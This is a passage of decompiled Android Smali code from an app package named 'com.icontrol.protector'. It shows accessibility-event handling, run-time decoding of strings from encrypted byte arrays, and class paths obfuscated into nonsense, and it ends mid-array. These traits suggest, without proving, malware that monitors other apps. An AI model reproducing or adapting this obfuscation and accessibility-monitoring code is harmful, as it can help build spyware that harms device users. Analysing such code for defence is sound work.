    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v3, 0x3

    new-array v4, v3, [B

    fill-array-data v4, :array_87

    new-array v5, v15, [B

    fill-array-data v5, :array_88

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_a

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v2, v3, [B

    fill-array-data v2, :array_89

    new-array v3, v15, [B

    fill-array-data v3, :array_8a

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v3, v1, [B

    const/16 v4, 0x19

    aput-byte v4, v3, v14

    new-array v4, v15, [B

    fill-array-data v4, :array_8b

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_a
    sput-boolean v1, Lcom/icontrol/protector/c;->b:Z

    :cond_b
    :goto_4
    sget-object v0, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_c

    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    invoke-virtual {v8, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_c

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_8c

    new-array v2, v15, [B

    fill-array-data v2, :array_8d

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v3, v1, [B

    const/16 v4, 0x2b

    aput-byte v4, v3, v14

    new-array v4, v15, [B

    fill-array-data v4, :array_8e

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    sget-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    sget-object v2, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v0, v2}, Ljava/util/LinkedList;->addAll(Ljava/util/Collection;)Z

    invoke-static/range {p1 .. p1}, Lcom/icontrol/protector/c;->o(Landroid/content/Context;)V

    sget-object v0, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    sget-object v0, Lcom/icontrol/protector/c;->d:Ljava/util/Set;

    invoke-interface {v0}, Ljava/util/Set;->clear()V

    :cond_c
    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v2, 0x800

    if-ne v0, v2, :cond_d

    const/4 v0, 0x7

    new-array v0, v0, [B

    fill-array-data v0, :array_8f

    new-array v2, v15, [B

    fill-array-data v2, :array_90

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    sget-object v0, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_d

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v2, 0x3

    new-array v2, v2, [B

    fill-array-data v2, :array_91

    new-array v3, v15, [B

    fill-array-data v3, :array_92

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v1, v1, [B

    const/16 v3, -0x65

    aput-byte v3, v1, v14

    new-array v3, v15, [B

    fill-array-data v3, :array_93

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    sget-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    sget-object v1, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v0, v1}, Ljava/util/LinkedList;->addAll(Ljava/util/Collection;)Z

    invoke-static/range {p1 .. p1}, Lcom/icontrol/protector/c;->o(Landroid/content/Context;)V

    sget-object v0, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    sget-object v0, Lcom/icontrol/protector/c;->d:Ljava/util/Set;

    invoke-interface {v0}, Ljava/util/Set;->clear()V

    :cond_d
    return-void

    nop

    :array_0
    .array-data 1
        -0x2bt
        -0x5at
        -0x35t
        0x5ft
        -0x21t
        -0x6dt
        0x8t
        -0x1t
        -0x58t
        -0x28t
        -0x3t
        0xft
        -0x65t
        -0x4bt
        0x63t
        -0x5et
        -0x48t
        -0x53t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x30t
        0x3dt
        0x75t
        -0x47t
        0x7et
        0x1bt
        -0x11t
        0x44t
    .end array-data

    :array_2
    .array-data 1
        -0x52t
        0x47t
        -0x38t
        0x5ft
        -0x46t
        -0x4ct
        0x29t
        -0x1dt
        -0x1ft
        0x33t
        -0x3t
        0x4t
        -0x2t
        -0x6et
        0x42t
        -0x44t
        -0x3dt
        0x4bt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x4bt
        -0x25t
        0x5et
        -0x47t
        0x1bt
        0x3ct
        -0x32t
        0x5at
    .end array-data

    :array_4
    .array-data 1
        0x67t
        0x43t
        0x16t
        -0x6dt
        -0x29t
        -0xbt
        -0x7ft
        -0x5t
        0x28t
        0x37t
        0x23t
        -0x35t
        -0x71t
        -0x7t
        -0x16t
        -0x5ct
        0xat
        0x4ft
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x7et
        -0x21t
        -0x80t
        0x76t
        0x6at
        0x57t
        0x66t
        0x42t
    .end array-data

    :array_6
    .array-data 1
        0x71t
        0x7bt
        -0x10t
        0x2ct
        0x6at
        0x19t
        0x59t
        -0x1ft
        0x2et
        0x24t
        -0x1bt
        0x68t
        0x16t
        0x3ct
        0x2at
        -0x7dt
        0x8t
        0x5at
        -0x5ct
        0x6at
        0x77t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x6ct
        -0x34t
        0x42t
        -0x35t
        -0x1t
        -0x4et
        -0x44t
        0x66t
    .end array-data

    :array_8
    .array-data 1
        -0x75t
        -0x4dt
        0x2et
        0x16t
        0xct
        0x0t
        0x65t
        -0x1t
        -0x2ct
        -0x14t
        0x3bt
        0x52t
        0x70t
        0x25t
        0x16t
        -0x63t
        -0xet
        -0x6et
        0x79t
        0x4ct
        0x3bt
    .end array-data

    nop

    :array_9
    .array-data 1
        0x6et
        0x4t
        -0x64t
        -0xft
        -0x67t
        -0x55t
        -0x80t
        0x78t
    .end array-data

    :array_a
    .array-data 1
        0x73t
        0x3bt
        -0x6ct
        0x50t
        0xet
        0xat
        -0x69t
        -0x5bt
        0x2ct
        0x5bt
        -0x7at
        0x0t
        0x6ft
        0x34t
        -0x8t
        -0x3dt
        0x3et
        0x34t
        -0x1ft
        0x9t
        0xat
        0x56t
        -0xbt
        -0x4ft
        0x73t
        0x39t
        -0x45t
        0x50t
        0xdt
        0x22t
        -0x69t
        -0x59t
        0xft
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x70t
        -0x48t
        0x5t
        -0x4dt
        -0x74t
        -0x4bt
        0x74t
        0x26t
    .end array-data

    :array_c
    .array-data 1
        0x3et
        0x58t
        -0x2dt
        -0x6bt
        0xft
        0x58t
        0x69t
        0x2at
        0x61t
        0x38t
        -0x3ft
        -0x3bt
        0x6et
        0x66t
        0x24t
        0x4ft
        0x52t
        0x54t
        -0x5bt
        -0x1et
        0x36t
        0x4t
        0xbt
        0x25t
        0x38t
        0x75t
        -0x32t
        -0x6et
        0x37t
        0x61t
        0x69t
        0x28t
        0x4at
        0x38t
        -0x3dt
        -0x38t
        0x6et
        0x66t
        0x1dt
        0x4at
        0x5ct
        0x44t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x23t
        -0x25t
        0x42t
        0x76t
        -0x73t
        -0x19t
        -0x76t
        -0x57t
    .end array-data

    :array_e
    .array-data 1
        -0x67t
        0x45t
        0x2ct
        -0x5ft
        -0x45t
        -0x3at
        -0x62t
        -0x1dt
        -0x56t
        0x4bt
        0x35t
        -0x5bt
        -0x4et
        -0x2ft
        -0x7ct
        -0x5at
        -0x53t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x37t
        0x24t
        0x58t
        -0x2bt
        -0x22t
        -0x4ct
        -0x10t
        -0x3dt
    .end array-data

    :array_10
    .array-data 1
        -0x72t
        -0x27t
        0x3ct
        -0x5dt
        -0x51t
        -0xet
        0x65t
        0x6ct
        -0x6t
        -0x2ft
        0x7ft
        -0x13t
        -0x59t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x63t
        0x55t
        -0x6ct
        0x4et
        0x2bt
        0x46t
        0x45t
        -0x80t
    .end array-data

    :array_12
    .array-data 1
        0x3dt
        -0x3ct
        -0x27t
        -0x1et
        -0x2ft
        0x4t
        -0x5bt
        0x18t
        0x64t
        0x68t
        -0x63t
        -0x6at
        -0x2ft
        0x5bt
        -0x16t
        0x9t
        0x3bt
        -0x28t
        -0x27t
    .end array-data

    :array_13
    .array-data 1
        -0x30t
        0x48t
        0x71t
        0xft
        0x55t
        -0x50t
        0x49t
        -0x7bt
    .end array-data

    :array_14
    .array-data 1
        -0x2bt
        -0x34t
        -0xbt
        0x6ct
        -0x78t
        0x15t
        0x0t
        0x12t
        -0x7ct
        -0x6ft
        -0x16t
        0x1ft
        -0x2at
        0x3bt
        0x6bt
        0x4ct
        -0x78t
        -0x2dt
        -0x49t
        0x31t
        -0x7ct
        0x67t
        0x5dt
        0xat
        -0x2bt
        -0x33t
        -0x24t
        0x6ct
        -0x75t
        0x11t
        0x0t
        0x12t
        -0x79t
        -0x6ft
        -0x16t
        0x3et
        -0x2at
        0x3at
        0x46t
        0x4ct
        -0x77t
        -0x6t
        -0x49t
        0x31t
        -0x54t
        0x67t
        0x5dt
        0xet
        -0x2bt
        -0x33t
        -0x26t
    .end array-data

    :array_15
    .array-data 1
        0x35t
        0x71t
        0x57t
        -0x74t
        0x36t
        -0x79t
        -0x20t
        -0x54t
    .end array-data

    :array_16
    .array-data 1
        0x3et
        0x3dt
        -0x11t
        0x48t
        -0x6t
        -0x36t
        -0x2bt
        0x29t
        0x3ft
        0x12t
        -0x14t
        0x6ft
        -0x8t
        -0x27t
        0x2dt
        0x5et
        0x4ct
        0x43t
        -0x6dt
        0x4t
        -0x5at
        -0x6ct
        -0x56t
        0x5ft
        0x63t
        0x42t
        -0x50t
        0x5t
        -0x7ct
        -0x6bt
        -0x75t
        0x5et
        0x49t
        0x42t
        -0x43t
    .end array-data

    :array_17
    .array-data 1
        -0x1at
        -0x65t
        0x34t
        -0x23t
        0x23t
        0x4ct
        0xdt
        -0x7at
    .end array-data

    :array_18
    .array-data 1
        -0x8t
        -0x73t
        0x2et
        0x6at
        0x12t
        0x55t
        -0x26t
        0x4et
        0x18t
        -0x73t
        0x60t
        0x6dt
        0x11t
        0x0t
        -0x27t
        -0x14t
        -0x21t
        -0x70t
        -0x7dt
        -0x56t
        0x11t
    .end array-data

    nop

    :array_19
    .array-data 1
        -0x45t
        -0x1et
        0x40t
        0x9t
        0x7et
        0x20t
        -0x57t
        -0x73t
    .end array-data

    :array_1a
    .array-data 1
        0x2bt
        0x39t
        -0x69t
        -0x68t
        0x4bt
        0x4dt
        -0x61t
        -0x3ft
        0xbt
        0x33t
        -0x3ct
        -0x73t
        0x44t
        0x41t
        -0x7et
        0x22t
        -0x34t
        0x33t
        -0x3ct
        -0x62t
        0x4at
        0x4bt
        -0x6dt
        -0x73t
        0x1at
        -0x61t
        0x49t
        -0x67t
        0x4at
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x6ft
        0x5ct
        -0x1ct
        -0x3t
        0x25t
        0x25t
        -0x10t
        -0x1ft
    .end array-data

    :array_1c
    .array-data 1
        -0x57t
        -0x13t
        0x52t
        0x13t
        -0x1at
        0x53t
        -0x65t
        0xbt
        -0x66t
        -0x1dt
        0x58t
        0x2t
        0x49t
        -0x7bt
        0x37t
        -0x7at
        -0x63t
        -0x1dt
    .end array-data

    nop

    :array_1d
    .array-data 1
        -0x7t
        -0x74t
        0x36t
        0x61t
        0x25t
        -0x10t
        -0xct
        0x2bt
    .end array-data

    :array_1e
    .array-data 1
        -0x4t
        0x30t
        -0x78t
        0x21t
        -0x5dt
        -0x39t
        0x68t
        0x59t
        -0x28t
        0x30t
        -0x7ft
        0x32t
        0xdt
        0x8t
        0x66t
        0x17t
        -0x38t
        -0x6bt
        0x5dt
    .end array-data

    :array_1f
    .array-data 1
        -0x54t
        0x51t
        -0x14t
        0x53t
        0x60t
        0x64t
        0x7t
        0x79t
    .end array-data

    :array_20
    .array-data 1
        -0x31t
        0x20t
        -0x4dt
        -0x67t
        0x75t
        0x5t
        -0x28t
        0x72t
        -0x7t
        0x31t
        0x50t
        0x49t
        0x3at
        0xdt
        -0x3ct
        0x3et
        -0x14t
        0x24t
        -0x19t
        -0x78t
        -0x27t
        -0x25t
        -0x3at
    .end array-data

    :array_21
    .array-data 1
        -0x64t
        0x45t
        -0x6dt
        -0x6t
        0x1at
        0x68t
        -0x58t
        0x1et
    .end array-data

    :array_22
    .array-data 1
        -0xat
        -0x1et
        -0xct
        -0x16t
        -0x41t
        0x4t
        -0x51t
        0x4ct
        -0x2ct
        -0x3t
    .end array-data

    nop

    :array_23
    .array-data 1
        -0x4bt
        -0x73t
        -0x7at
        -0x75t
        -0x2ct
        0x24t
        -0x24t
        0x25t
    .end array-data

    :array_24
    .array-data 1
        -0x1et
        0x53t
        0xdt
        -0x58t
        -0x58t
        0x12t
        0x31t
        0x6bt
        -0x1dt
        0x70t
        -0xct
        -0xdt
        -0x29t
        0x61t
        0x6ct
        0x37t
        -0x44t
        0x2dt
        0x51t
        -0xdt
        -0x39t
    .end array-data

    nop

    :array_25
    .array-data 1
        0x3at
        -0xct
        -0x2ct
        0x2bt
        0x70t
        -0x48t
        -0x18t
        -0x12t
    .end array-data

    :array_26
    .array-data 1
        -0x2t
        -0x47t
        0x2et
        0x29t
        -0x67t
        -0x17t
        -0x27t
        -0x11t
        -0x79t
        0x9t
        -0x6bt
        -0x1bt
        -0x29t
        -0x8t
        0x18t
        0x3dt
        -0x7t
        -0x7bt
        -0x7dt
        -0x1et
    .end array-data

    :array_27
    .array-data 1
        0x3at
        0x29t
        -0x13t
        -0x76t
        -0x47t
        -0x61t
        0x38t
        0x55t
    .end array-data

    :array_28
    .array-data 1
        0x39t
        0x63t
        -0x27t
    .end array-data

    :array_29
    .array-data 1
        0x65t
        0x7t
        -0xet
        0x72t
        0x4t
        -0x3dt
        0xbt
        0x78t
    .end array-data

    :array_2a
    .array-data 1
        0x62t
        -0x35t
        -0x47t
        -0x48t
        -0x29t
        0xet
        0x2bt
        0x41t
        0x1ft
        -0x6et
        -0x4ft
        -0x15t
        -0x6bt
        0x1et
        0x72t
        0x1ct
        0x26t
        -0x1t
    .end array-data

    nop

    :array_2b
    .array-data 1
        -0x79t
        0x77t
        0x39t
        0x5dt
        0x70t
        -0x7bt
        -0x34t
        -0x6t
    .end array-data

    :array_2c
    .array-data 1
        0x71t
        0x76t
        0x4ft
        -0x11t
        0x64t
        0x4et
        0x3ft
        0x79t
        0x32t
        0x8t
        0x67t
        -0x49t
        0x26t
        0x59t
        0x4et
        0x26t
        0x39t
        0x68t
    .end array-data

    nop

    :array_2d
    .array-data 1
        -0x68t
        -0x20t
        -0x3ct
        0xat
        -0x3dt
        -0x3bt
        -0x28t
        -0x40t
    .end array-data

    :array_2e
    .array-data 1
        -0x1ft
        -0x66t
        0x34t
        -0x5at
        -0x59t
        0x5t
        0x53t
        0xct
        -0x71t
        -0x36t
        0x3ft
        -0x1bt
        -0x27t
        0x2dt
        0xbt
        0x43t
        -0x5dt
        -0x72t
        0x6ft
        -0x3ft
        -0x59t
        0x6bt
        0x2at
        0x3dt
        -0x1et
        -0x74t
        0xet
    .end array-data

    :array_2f
    .array-data 1
        0x4t
        0x2dt
        -0x7at
        0x4ft
        0x31t
        -0x72t
        -0x4at
        -0x55t
    .end array-data

    :array_30
    .array-data 1
        0x29t
        -0xet
        -0x3at
        -0x38t
        -0x34t
        0x12t
        0x30t
        -0x27t
        0x6at
        -0x74t
        -0x12t
        -0x70t
        -0x72t
        0x5t
        0x41t
        -0x7bt
        0x7dt
        -0x3at
    .end array-data

    nop

    :array_31
    .array-data 1
        -0x40t
        0x64t
        0x4dt
        0x2dt
        0x6bt
        -0x67t
        -0x29t
        0x60t
    .end array-data

    :array_32
    .array-data 1
        0x4ct
        0x50t
        0x35t
        -0xdt
        -0x33t
        -0x6at
        0x18t
        -0x6bt
        0xft
        0x2et
        0x1dt
        -0x55t
        -0x7et
        -0x46t
        0x5ct
        -0x3bt
        0x2bt
        0x50t
        0x5bt
        -0x76t
        -0x4t
        -0x8t
        0x42t
        -0x72t
    .end array-data

    :array_33
    .array-data 1
        -0x5bt
        -0x3at
        -0x42t
        0x16t
        0x6at
        0x1dt
        -0x1t
        0x2ct
    .end array-data

    :array_34
    .array-data 1
        0x24t
        0xct
        -0x78t
        0x5bt
        -0x20t
        -0x29t
        0x5ft
        -0x46t
        0x4at
        0x5ct
        -0x7dt
        0x18t
        -0x62t
        -0x1t
        0x7t
        -0xbt
        0x66t
        0x18t
        -0x2dt
        0x3ct
        -0x20t
        -0x47t
        0x26t
        -0x75t
        0x24t
        0x6t
        -0x68t
    .end array-data

    :array_35
    .array-data 1
        -0x3ft
        -0x45t
        0x3at
        -0x4et
        0x76t
        0x5ct
        -0x46t
        0x1dt
    .end array-data

    :array_36
    .array-data 1
        -0x6et
        0x38t
        -0x71t
        -0x65t
        0x5ct
        0x9t
        0x32t
        -0x2et
        -0x4t
        0x68t
        -0x7ct
        -0x28t
        0x22t
        0x21t
        0x6at
        -0x63t
        -0x30t
        0x2ct
        -0x2ct
        -0x4t
        0x5ct
        0x67t
        0x4bt
        -0x1dt
        -0x6et
        0x32t
        -0x61t
    .end array-data

    :array_37
    .array-data 1
        0x77t
        -0x71t
        0x3dt
        0x72t
        -0x36t
        -0x7et
        -0x29t
        0x75t
    .end array-data

    :array_38
    .array-data 1
        0x1ft
        0xdt
        -0x2t
        -0x15t
        -0x2ct
        0x15t
        0x73t
        0x3t
        0x40t
        0x6dt
        -0x14t
        -0x45t
        -0x4bt
        0x2bt
        0x1ct
        0x69t
        0x6at
        0x5t
        -0x76t
        -0x51t
        -0x23t
        0x49t
        0x11t
        0x15t
        0x1ft
        0xct
        -0x1dt
        -0x15t
        -0x29t
        0x14t
        0x73t
        0x1t
        0x6bt
        0x6dt
        -0x12t
        -0x69t
    .end array-data

    :array_39
    .array-data 1
        -0x4t
        -0x72t
        0x6ft
        0x8t
        0x56t
        -0x56t
        -0x70t
        -0x80t
    .end array-data

    :array_3a
    .array-data 1
        -0x5bt
        0x3t
        0x35t
        -0x7ft
        -0x7ct
        -0x3at
        0x5ct
        0x6t
        -0x6t
        0x63t
        0x27t
        -0x2ft
        -0x1bt
        -0x8t
        0x11t
        0x63t
        -0x37t
        0xft
        0x43t
        -0xat
        -0x43t
        -0x66t
        0x3dt
        0x17t
        -0x51t
        0x16t
        0x2ft
        -0x79t
        -0x5ft
        -0xet
        0x5ct
        0x4t
        -0x2ft
        0x63t
        0x25t
        -0x24t
        -0x1bt
        -0x8t
        0x28t
        0x66t
        -0x39t
        0x1ft
    .end array-data

    nop

    :array_3b
    .array-data 1
        0x46t
        -0x80t
        -0x5ct
        0x62t
        0x6t
        0x79t
        -0x41t
        -0x7bt
    .end array-data

    :array_3c
    .array-data 1
        0x33t
        0x6bt
        -0x32t
        0x65t
        0x74t
        -0x26t
        -0x5dt
        0x35t
        0x10t
        0x7et
        -0x25t
        0x63t
        0x65t
        -0x33t
        -0x57t
    .end array-data

    :array_3d
    .array-data 1
        0x63t
        0xat
        -0x46t
        0x11t
        0x11t
        -0x58t
        -0x33t
        0x15t
    .end array-data

    :array_3e
    .array-data 1
        0x9t
        -0x80t
        -0x4at
        -0x5ft
        0x18t
        0x4t
        0x2dt
        0x2ft
        0x6ft
        -0x70t
        -0xet
        -0x2et
        0xdt
    .end array-data

    nop

    :array_3f
    .array-data 1
        -0x1ct
        0xct
        0x1et
        0x4ct
        -0x64t
        -0x50t
        0xdt
        -0x3dt
    .end array-data

    :array_40
    .array-data 1
        -0xdt
        -0x2et
        -0xdt
        0x6ct
        0x66t
        -0x13t
        -0x42t
        -0x24t
        -0x56t
        0x7et
        -0x49t
        0xat
        0x7et
        -0x4bt
        -0x34t
        -0x30t
        -0xbt
        -0x32t
        -0xdt
    .end array-data

    :array_41
    .array-data 1
        0x1et
        0x5et
        0x5bt
        -0x7ft
        -0x1et
        0x59t
        0x52t
        0x41t
    .end array-data

    :array_42
    .array-data 1
        0x65t
        -0x5et
        0x56t
        -0x11t
        -0x19t
        -0x7bt
        0x37t
        0x43t
        0x34t
        -0x1t
        0x49t
        -0x64t
        -0x47t
        -0x55t
        0x5ct
        0x1dt
        0x38t
        -0x43t
        0x14t
        -0x4et
        -0x15t
        -0x9t
        0x6at
        0x5bt
        0x65t
        -0x5dt
        0x7ft
        -0x11t
        -0x1ct
        -0x49t
        0x37t
        0x40t
        0x13t
        -0x1t
        0x4at
        -0x43t
        -0x47t
        -0x56t
        0x65t
        0x1dt
        0x39t
        -0x6ct
        0x14t
        -0x4et
        -0x7t
        -0x9t
        0x6at
        0x7ft
        0x65t
        -0x5et
        0x48t
        -0x11t
        -0x1bt
        -0x64t
        0x37t
        0x40t
        0x1ft
        -0x1t
        0x49t
        -0x45t
        -0x47t
        -0x56t
        0x55t
        0x1dt
        0x38t
        -0x47t
        0x14t
        -0x4dt
        -0x2et
        -0x9t
        0x6at
        0x69t
        0x65t
        -0x5dt
        0x79t
    .end array-data

    :array_43
    .array-data 1
        -0x7bt
        0x1ft
        -0xct
        0xft
        0x59t
        0x17t
        -0x29t
        -0x3t
    .end array-data

    :array_44
    .array-data 1
        0xbt
        -0x40t
        0x1ft
        -0x1ft
        0x37t
        -0x26t
        -0x28t
        0x12t
        0xat
        -0x11t
        0x1ct
        -0x3at
        0x35t
        -0x37t
        0x20t
        0x65t
        0x60t
        -0x41t
        0x4dt
        -0x54t
        0x5ct
        -0x7bt
        -0x77t
        0x65t
        0x67t
        -0x41t
        0x42t
        -0x53t
        0x67t
        0x7ct
        -0x28t
        0x15t
        0xbt
        -0x3ft
        0x1ct
        -0x40t
        0x37t
        -0x28t
        -0x27t
        0x34t
        0xbt
        -0x37t
        0x1dt
        -0x3t
    .end array-data

    :array_45
    .array-data 1
        -0x2dt
        0x66t
        -0x3ct
        0x74t
        -0x12t
        0x5ct
        0x0t
        -0x43t
    .end array-data

    :array_46
    .array-data 1
        0x49t
        -0x67t
        -0x46t
        -0x2t
        0x4bt
        0x70t
        -0x37t
        -0x5at
        0x64t
        -0x68t
        0x59t
        0x23t
        0x49t
        0x7dt
        -0x2ct
        0x45t
        -0x5dt
        -0x68t
    .end array-data

    nop

    :array_47
    .array-data 1
        0x0t
        -0x9t
        0x79t
        0x53t
        0x28t
        0x19t
        -0x5at
        -0x7at
    .end array-data

    :array_48
    .array-data 1
        0x9t
        0x15t
        0x72t
        0x5et
        0x73t
        -0x4et
        0x70t
        -0x4bt
        0x24t
        0x14t
        -0x6ft
        -0x69t
        0x75t
        -0x58t
        0x7at
        -0x5t
        0x28t
        0x14t
        -0x6ft
        -0x69t
        0x7ft
        -0x5t
        0x6ft
        -0xct
        0x24t
        0x9t
        0x72t
        0x50t
        0x7ft
    .end array-data

    nop

    :array_49
    .array-data 1
        0x40t
        0x7bt
        -0x4ft
        -0xdt
        0x10t
        -0x25t
        0x1ft
        -0x6bt
    .end array-data

    :array_4a
    .array-data 1
        0x53t
        -0x60t
        0xdt
        0x1et
        -0x79t
        0x9t
        -0x71t
        0x45t
        0x6at
        -0x51t
        0x0t
        0xft
        0x2dt
        -0x35t
        -0x7ct
        0xat
    .end array-data

    :array_4b
    .array-data 1
        0x3t
        -0x3ft
        0x69t
        0x6ct
        0x44t
        -0x56t
        -0x20t
        0x65t
    .end array-data

    :array_4c
    .array-data 1
        0x17t
        -0x38t
        0x65t
        0x6t
        0x68t
        0x5bt
        0x4t
        0x5bt
        0x25t
        -0x38t
        -0x3ct
        -0x15t
        -0x39t
        -0x67t
        0xft
        -0x41t
        -0xat
    .end array-data

    nop

    :array_4d
    .array-data 1
        0x47t
        -0x57t
        0x1t
        0x74t
        -0x55t
        -0x8t
        0x6bt
        0x7bt
    .end array-data

    :array_4e
    .array-data 1
        0x16t
        0x31t
        0x5ft
        -0x1t
        0x58t
        0x1dt
        0x53t
        -0x6at
        0x36t
        0x3bt
        0xct
        -0x16t
        0x57t
        0x11t
        0x4et
        0x75t
        -0xft
        0x3bt
        0xct
        -0xdt
        0x58t
        0x1ct
        0x5ft
        -0x21t
        0x33t
        0x30t
        0x43t
    .end array-data

    :array_4f
    .array-data 1
        0x52t
        0x54t
        0x2ct
        -0x66t
        0x36t
        0x75t
        0x3ct
        -0x4at
    .end array-data

    :array_50
    .array-data 1
        0x24t
        0x8t
        0x72t
        -0x76t
        -0x40t
        -0x10t
        0x8t
        -0x43t
        -0x4ct
        -0x22t
        0x72t
        -0x7at
        -0x3et
        -0x47t
        0x1bt
        -0x4bt
        0x3t
        0x1ft
        -0x6ft
        0x50t
        -0x40t
    .end array-data

    nop

    :array_51
    .array-data 1
        0x77t
        0x6dt
        0x52t
        -0x1dt
        -0x52t
        -0x67t
        0x6bt
        -0x2ct
    .end array-data

    :array_52
    .array-data 1
        0x46t
        0x2et
        -0x49t
        0x58t
        -0x68t
        0x1et
        0x54t
        0x3et
        0x68t
        0x34t
        -0x57t
        0x58t
        -0x68t
        0x5ft
        0x5et
    .end array-data

    :array_53
    .array-data 1
        0x5t
        0x41t
        -0x3bt
        0x39t
        -0xdt
        0x3et
        0x30t
        0x57t
    .end array-data

    :array_54
    .array-data 1
        -0x29t
        -0x2dt
        0x5bt
        -0x4dt
        0x30t
        -0x2t
        -0x54t
        0x5t
        -0x58t
